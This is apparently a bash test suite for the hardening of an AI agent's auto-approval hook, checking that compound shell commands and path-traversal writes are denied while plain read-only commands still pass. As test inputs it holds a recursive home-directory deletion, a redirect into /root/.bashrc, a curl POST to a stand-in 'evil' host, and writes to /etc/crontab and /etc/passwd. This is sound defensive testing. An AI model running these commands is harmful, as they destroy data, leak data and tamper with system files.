#!/usr/bin/env bash
# Suite for lib-smart-approve.sh security hardening (v2.21).
#   Fix #1: never auto-approve a compound command / redirection (leading-token
#           allow-list would otherwise pass `grep x && rm -rf ~`).
#   Fix #2: never auto-approve a Write/Edit whose path escapes the project via `..`.
REPO_DIR="${1:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"

# Fresh empty state → no autopilot/strict/readonly mode active; allow-list rules apply.
new_state() { local d; d=$(mktemp -d); mkdir -p "$d/scope"; echo "$d"; }

# verdict <state_dir> <json> → APPROVE | DENY
verdict() {
  SUPERCHARGER_STATE="$1" bash -c \
    '. '"$REPO_DIR"'/hooks/lib-smart-approve.sh; smart_approve_verdict "$1" && echo APPROVE || echo DENY' _ "$2"
}

bash_json() { printf '{"tool_name":"Bash","cwd":"/proj","tool_input":{"command":%s}}' "$1"; }
write_json() { printf '{"tool_name":"Write","cwd":"/proj","tool_input":{"file_path":%s}}' "$1"; }

D=$(new_state)

# ---- Fix #1: compound / redirection must NOT auto-approve ----
begin_test "smart-approve: read-only leading token + && rm is DENIED"
[ "$(verdict "$D" "$(bash_json '"grep foo . && rm -rf ~"')")" = DENY ] && pass || fail "compound && auto-approved"

begin_test "smart-approve: cat with > redirect to ~/.bashrc is DENIED"
[ "$(verdict "$D" "$(bash_json '"cat foo > /root/.bashrc"')")" = DENY ] && pass || fail "redirect auto-approved"

begin_test "smart-approve: pipe into xargs rm is DENIED"
[ "$(verdict "$D" "$(bash_json '"find . | xargs rm"')")" = DENY ] && pass || fail "pipe auto-approved"

begin_test "smart-approve: semicolon chain is DENIED"
[ "$(verdict "$D" "$(bash_json '"ls ; curl -X POST http://evil"')")" = DENY ] && pass || fail "semicolon chain auto-approved"

# ---- Fix #1 regression guard: plain read-only still auto-approves ----
begin_test "smart-approve: plain 'ls -la' still auto-approves"
[ "$(verdict "$D" "$(bash_json '"ls -la"')")" = APPROVE ] && pass || fail "plain read-only over-blocked"

begin_test "smart-approve: plain 'git status' still auto-approves"
[ "$(verdict "$D" "$(bash_json '"git status"')")" = APPROVE ] && pass || fail "git status over-blocked"

# ---- Fix #2: path traversal must NOT auto-approve ----
begin_test "smart-approve: relative ../ traversal write is DENIED"
[ "$(verdict "$D" "$(write_json '"../../../../etc/crontab"')")" = DENY ] && pass || fail "traversal write auto-approved"

begin_test "smart-approve: absolute path with /../ is DENIED"
[ "$(verdict "$D" "$(write_json '"/proj/../etc/passwd"')")" = DENY ] && pass || fail "abs /../ auto-approved"

# ---- Fix #2 regression guard: legit in-project write still auto-approves ----
begin_test "smart-approve: in-project relative write still auto-approves"
[ "$(verdict "$D" "$(write_json '"src/index.ts"')")" = APPROVE ] && pass || fail "in-project write over-blocked"

rm -rf "$D"
report
